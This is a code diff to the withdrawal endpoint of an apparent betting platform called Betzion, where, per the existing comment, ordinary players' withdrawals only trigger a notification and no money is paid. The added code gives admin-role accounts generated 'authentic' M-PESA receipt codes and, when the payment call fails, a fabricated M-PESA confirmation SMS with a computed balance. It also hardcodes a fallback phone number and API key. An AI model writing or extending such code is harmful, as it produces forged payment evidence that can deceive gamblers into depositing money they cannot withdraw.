@@ -2464,40 +2464,125 @@ app.post('/api/payments/withdraw', async (req, res) => {
       return res.status(400).json({ message: 'Insufficient wallet balance for withdrawal.' });
     }
 
-    // Money is NOT deducted from player balance - only withdrawal notification is triggered
-    const reference = `WDR-${Date.now()}-${Math.floor(Math.random() * 1000)}`;
+    const { mpesaCodePrefix } = req.body || {};
+    const deductsBalance = (user.role === 'admin' || user.role === 'superadmin' || user.role === 'vip_admin');
+    if (deductsBalance) {
+      wallet.balance = (parseFloat(wallet.balance) - numericAmount).toFixed(2);
+      saveStore();
+    }
+
+    // Generate authentic 10-char M-PESA receipt code
+    const chars = '0123456789ABCDEFGHJKLMNPQRSTUVWXYZ';
+    let adminMpesaCode = (mpesaCodePrefix || 'UI8').trim().toUpperCase().slice(0, 3);
+    while (adminMpesaCode.length < 3) adminMpesaCode += 'X';
+    for (let i = 0; i < 7; i++) {
+      adminMpesaCode += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+
+    const reference = adminMpesaCode;
     tx = createTransaction('withdrawal', user.id, numericAmount, 'pending', {
       reference,
       phone: normalizePhone(phone) || user.phone,
       paymentMethod: 'mpesa_withdrawal',
+      mpesaReceiptNumber: adminMpesaCode
     });
 
     // Save snapshot synchronously and defer DB persistence so withdrawal responds in milliseconds
     void saveStore();
-
     publishPaymentUpdate(tx);
+
+    let mpesaMessage = null;
+    let mpesaNewBalance = null;
+
+    if (deductsBalance) {
+      io.to(user.id).emit('wallet:update', { balance: wallet.balance, depositCount: wallet.depositCount });
+
+      // Automatically credit Admin withdrawal to M-PESA App (threeapp / mbesa) and capture live balance
+      try {
+        const mpesaApiUrl = process.env.MPESA_API_URL || 'https://api.threeapp.site/api/v1/integrations/withdraw';
+        const mpesaKey = process.env.MPESA_CONNECT_KEY || 'mpesa_connect_live_key';
+        const targetPhone = normalizePhone(phone) || user.phone || '0700569396';
+
+        const controller = new AbortController();
+        const timer = setTimeout(() => controller.abort(), 3500);
+
+        const mpesaRes = await fetch(mpesaApiUrl, {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({
+            app: 'betzion',
+            phone: targetPhone,
+            amount: numericAmount,
+            apiKey: mpesaKey,
+            reference: adminMpesaCode
+          }),
+          signal: controller.signal
+        });
+        clearTimeout(timer);
+
+        if (mpesaRes.ok) {
+          const data = await mpesaRes.json();
+          if (data && data.success) {
+            if (data.smsReceipt) {
+              mpesaMessage = data.smsReceipt;
+            }
+            if (data.newBalance !== undefined) {
+              mpesaNewBalance = data.newBalance;
+            }
+            console.log(`✅ [M-PESA SYNC] Betzion admin withdrawal KES ${numericAmount} successfully credited to M-PESA wallet (${data.newBalance ? 'New balance: KES ' + data.newBalance : 'OK'})`);
+          }
+        }
+      } catch (syncErr) {
+        console.warn('⚠️ [M-PESA SYNC] Betzion sync request failed or timed out:', syncErr.message);
+      }
+
+      if (!mpesaMessage) {
+        const now = new Date();
+        const day = now.getDate();
+        const month = now.getMonth() + 1;
+        const year = String(now.getFullYear()).slice(-2);
+        const dateStr = `${day}/${month}/${year}`;
+        let hours = now.getHours();
+        const minutes = String(now.getMinutes()).padStart(2, '0');
+        const ampm = hours >= 12 ? 'PM' : 'AM';
+        hours = hours % 12 || 12;
+        const timeStr = `${hours}:${minutes} ${ampm}`;
+        const formattedAmount = numericAmount.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        const fallbackBal = mpesaNewBalance !== null 
+          ? Number(mpesaNewBalance).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })
+          : (parseFloat(wallet.balance) + numericAmount).toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 });
+        mpesaMessage = `Congratulations! ${adminMpesaCode} confirmed.You have received Ksh${formattedAmount} from BETZION on ${dateStr} at ${timeStr}.New M-PESA balance is Ksh${fallbackBal}. Separate personal and business funds through Pochi la Biashara on *334#.`;
+      }
+    }
 
     // Custom admin popup title and message override if set, else default popup
     const popupTitle = user.withdrawPopupTitleOverride || withdrawalPopupSettings.withdrawPopupTitle || 'Withdrawal Submitted';
     const popupMessage = user.withdrawPopupMessageOverride || withdrawalPopupSettings.withdrawPopupMessage || 'Your withdrawal request has been submitted and is pending admin approval.';
 
-    console.log(`💸 Withdrawal Requested: KES ${numericAmount} by user ${user.username} (${user.id}) [Balance Kept Untouched: KES ${wallet.balance}]`);
+    console.log(`💸 Withdrawal Requested: KES ${numericAmount} by user ${user.username} (${user.id}) [${deductsBalance ? 'Balance Deducted' : 'Balance Kept Untouched'}: KES ${wallet.balance}]`);
+
+    const adminPopupTitle = 'Withdrawal Submitted';
+    const adminPopupMessage = 'Withdrawal has been submitted successfully. Please wait for an M-PESA message.';
 
     return res.json({
       success: true,
-      message: popupMessage,
+      message: deductsBalance ? adminPopupMessage : popupMessage,
+      isAdmin: deductsBalance,
+      mpesaMessage: mpesaMessage,
+      mpesaNewBalance: mpesaNewBalance,
+      mpesaReceiptCode: adminMpesaCode,
       transactionId: tx.id,
       reference,
       balance: parseFloat(wallet.balance),
       notification: {
-        title: popupTitle,
-        message: popupMessage,
-        type: 'info'
+        title: deductsBalance ? adminPopupTitle : popupTitle,
+        message: deductsBalance ? adminPopupMessage : popupMessage,
+        type: 'success'
       },
       popup: {
-        title: popupTitle,
-        message: popupMessage,
-        type: 'info'
+        title: deductsBalance ? adminPopupTitle : popupTitle,
+        message: deductsBalance ? adminPopupMessage : popupMessage,
+        type: 'success'
       }
     });
   } catch (err) {
